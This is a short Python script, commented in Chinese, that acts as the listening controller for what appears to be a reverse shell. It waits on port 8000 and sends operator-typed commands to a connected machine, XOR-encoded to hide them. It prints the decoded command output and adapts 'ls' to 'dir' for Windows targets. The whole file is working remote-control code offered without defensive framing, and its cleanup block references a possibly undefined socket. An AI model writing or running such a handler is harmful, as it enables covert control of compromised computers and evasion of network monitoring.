import socket

# 定义一个函数用于对数据进行XOR编码/解码
def xor_bytes(data, key):
    # 使用列表推导式遍历每个字节，并与给定的key进行异或操作
    return bytearray([b ^ key for b in data])

def main():
    # 创建一个新的TCP/IP套接字对象
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # 绑定套接字到本地所有可用接口上的端口8000
        s.bind(("0.0.0.0", 8000))
        # 设置套接字为监听模式，允许最多2个排队连接
        s.listen(2)
        print("Listening on port 8000... ")

        # 接受一个新的连接并获取客户端的地址信息
        client_socket, (ip, port) = s.accept()
        print(f"Received connection from: {ip}")

        while True:
            # 获取用户输入的命令并去除首尾空白字符
            command = input('~$ ').strip()
            if not command:
                # 如果命令为空，则跳过本次循环
                continue

            # 在Windows上运行时，将 'ls' 命令替换为 'dir'
            if command.lower() == 'ls':
                command = 'dir'

            # 将命令字符串编码为字节串，然后使用XOR进行加密
            encode = xor_bytes(command.encode(), 0x41)
            # 发送加密后的命令给客户端
            client_socket.send(encode)

            # 接收来自客户端的数据（最大2048字节）
            en_data = client_socket.recv(2048)
            if not en_data:
                # 如果没有接收到任何数据，则退出循环
                break

            # 对接收到的数据进行解密，并尝试将其转换为UTF-8字符串
            decode = xor_bytes(en_data, 0x41).decode('utf-8', errors='replace')
            # 打印解密后的命令输出
            print(decode)

    except Exception as e:
        # 捕获所有异常并打印错误信息
        print(f"An error occurred: {e}")
    finally:
        # 确保无论是否发生异常，都会关闭客户端和服务器套接字
        client_socket.close()
        s.close()

if __name__ == "__main__":
    # 如果此脚本是直接运行的，则调用main函数开始执行
    main()